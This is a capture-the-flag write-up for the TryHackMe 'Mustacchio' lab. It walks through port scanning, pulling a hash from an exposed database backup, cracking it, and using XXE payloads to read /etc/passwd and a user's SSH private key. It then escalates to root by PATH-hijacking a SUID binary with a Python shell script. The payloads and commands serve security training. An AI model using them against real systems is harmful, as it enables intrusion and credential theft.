------------------

### CTF: TRYHACKME
### LAB: Mustacchio

-------------------

![image](https://github.com/user-attachments/assets/b33c41e4-76fc-4120-956a-9aeb427d278a)


-------------------

### Reconnaissance

- Rustscan's output

      ❯ rustscan -a 10.10.158.4 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.158.4:22
      Open 10.10.158.4:80
      Open 10.10.158.4:8765
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 09:33 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 0.00s elapsed
      Initiating Ping Scan at 09:33
      Scanning 10.10.158.4 [2 ports]
      Completed Ping Scan at 09:33, 0.16s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 09:33
      Completed Parallel DNS resolution of 1 host. at 09:33, 0.01s elapsed
      DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 09:33
      Scanning 10.10.158.4 [3 ports]
      Discovered open port 22/tcp on 10.10.158.4
      Discovered open port 8765/tcp on 10.10.158.4
      Discovered open port 80/tcp on 10.10.158.4
      Completed Connect Scan at 09:33, 0.16s elapsed (3 total ports)
      Initiating Service scan at 09:33
      Scanning 3 services on 10.10.158.4
      Completed Service scan at 09:33, 11.55s elapsed (3 services on 1 host)
      NSE: Script scanning 10.10.158.4.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 5.23s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 0.60s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 09:33
      Completed NSE at 09:33, 0.01s elapsed
      Nmap scan report for 10.10.158.4
      Host is up, received syn-ack (0.15s latency).
      Scanned at 2024-08-15 09:33:02 EDT for 17s
      
      PORT     STATE SERVICE REASON  VERSION
      22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
      |   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
      |   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
      80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      | http-robots.txt: 1 disallowed entry 
      |_/
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: Mustacchio | Home
      8765/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
      |_http-server-header: nginx/1.10.3 (Ubuntu)
      |_http-title: Mustacchio | Login
      | http-methods: 
      |_  Supported Methods: GET HEAD POST
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


- Port 80|`http` reveals a web page

![image](https://github.com/user-attachments/assets/047a0826-3340-425a-878e-fe80208de044)

- Port 8765 shows an admin login page

![image](https://github.com/user-attachments/assets/0ccdc4e4-0290-4060-95de-c164d7f628f3)

- Checking the port 80's `custom/js` directory listing  reveals a `user.bak` file

![image](https://github.com/user-attachments/assets/084d64d6-96f6-48d4-8f93-bd4d154c1296)

- Checking the file type with `file <filename>` shows that it is an sqlite3 db

![image](https://github.com/user-attachments/assets/88e40da0-f3f5-4371-96ac-0b4674bf27cb)

------------------------------

### Reading the file with sqlite3 

- I used the `sqlite3` binary to open the db, and `.open <db's name>` to open it

![image](https://github.com/user-attachments/assets/3ed90e5d-6f56-472a-9a30-d42a0c58c506)

- I guessed the table and tried `select * from users;` which worked and showed a username and hash

![image](https://github.com/user-attachments/assets/b382fda7-3da0-45ad-94cc-1645d67ed2e6)

------------------------------

### Cracking the admin's hash with crackstation

- I cracked the hash with [Crackstation.net](https://crackstation.net/)

![image](https://github.com/user-attachments/assets/8805f1c1-c41a-4889-a3ea-cbb1aa87350e)

- Admin access

![image](https://github.com/user-attachments/assets/63748d4b-f958-47e7-929e-e9aed80c393b)

---------------------------------

### XML EXTERNAL ENTITY to file read

- I checked the source code and found that the textbox allows only xml input.There is also an hint that `user:barry` has a private ssh key. We can test for XXE and try to read Barry's ssh private key.

![image](https://github.com/user-attachments/assets/2bd6788e-42ed-4087-92de-293e3e35c173)

- The file highlighted shows the xml syntax for the textbox

  ![image](https://github.com/user-attachments/assets/fb075e29-8e18-47a9-ad0e-8abec4a34943)

- We will be testing this payload to see if we can read the `/etc/passwd` file

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
      <comment>
        <name>Joe Hamd</name>
        <author>Barry Clad</author>
        <com>&example;</com>
      </comment>

- It worked

![image](https://github.com/user-attachments/assets/d426b918-4937-49d7-b25d-24e3a4fc4072)

- The ssh key should be in this file path `file:///home/barry/.ssh/id_rsa`
      
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY example SYSTEM "/home/barry/.ssh/id_rsa"> ]>
      <comment>
        <name>Joe Hamd</name>
        <author>Barry Clad</author>
        <com>&example;</com>
      </comment>

- Now we have the key

![image](https://github.com/user-attachments/assets/f11aac76-05f7-4259-8437-88e15db350c0)

- I tried to ssh to the host as user `barry` with the private key but it presented a need for passphrase

![image](https://github.com/user-attachments/assets/b4fb4e65-2569-4640-af7b-341a2886ea7c)

- I cracked it with john the ripper but I used `--show` because I have cracked the hash.

![image](https://github.com/user-attachments/assets/2dbacc73-c045-415b-b977-126b0e101b69)

- SSH Access

![image](https://github.com/user-attachments/assets/c71fdd23-148b-40ad-9972-d79fa6988efa)

------------------------

### Privilege Escalation with path hijacking

- I checked for suid binaries with `find  / -type f -perm -u=s 2</dev/null` and got one `home/joe/live_log`

![image](https://github.com/user-attachments/assets/60101168-04c2-4bd2-825a-ee61735d2aec)

- I checked the binary with `strings /home/joe/live_log`. I noticed that the binary runs `tail` without specifying the path. We can hijack the path and force suid binary to run our malicious binary.

![image](https://github.com/user-attachments/assets/05a860e3-bd88-4e98-85f6-b6773200774c)

- Our malicious tail file,don't forget to `chmod +x`,this python will set our uid to 0 and spawn a `bash` shell

      #! /usr/bin/env python3 
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- We will add `/tmp` as a directory for the server to check for binaries before proceeding to `/usr/bin/` with `export PATH=/tmp:$PATH`.

![image](https://github.com/user-attachments/assets/0fb8b7f4-5281-447c-bacf-46d941ca58d7)

- Root

![image](https://github.com/user-attachments/assets/45d93e22-1111-4e80-8e48-2edae2823492)

----------------------

### THANKS FOR READING  


  









